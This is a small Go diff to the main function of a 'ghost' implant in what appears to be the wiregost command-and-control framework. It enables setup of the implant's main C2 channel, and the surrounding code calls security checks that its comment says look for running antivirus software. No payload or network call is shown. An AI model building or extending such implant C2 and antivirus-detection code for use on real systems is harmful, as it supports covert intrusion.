@@ -2,6 +2,7 @@ package main
 
 import (
 	"github.com/maxlandon/wiregost/ghost/assets"
+	"github.com/maxlandon/wiregost/ghost/channels"
 	"github.com/maxlandon/wiregost/ghost/info"
 	"github.com/maxlandon/wiregost/ghost/log"
 	"github.com/maxlandon/wiregost/ghost/profile"
@@ -21,8 +22,11 @@ func main() {
 	// Init logging
 	log.SetupLogging()
 
-	// Implant concurrency management.
-	// channels.SetupChannels()
+	// Implant concurrency management. This function sets the channel map
+	// and instantiates/registers the main C2 channel for this implant.
+	// It is not ready to be used, and below the communication/RPC insfrastructure
+	// will set the stream of this main channel.
+	channels.SetupChannels()
 
 	// Various Security checks (antivirus software running, etc)
 	security.SetupSecurity()
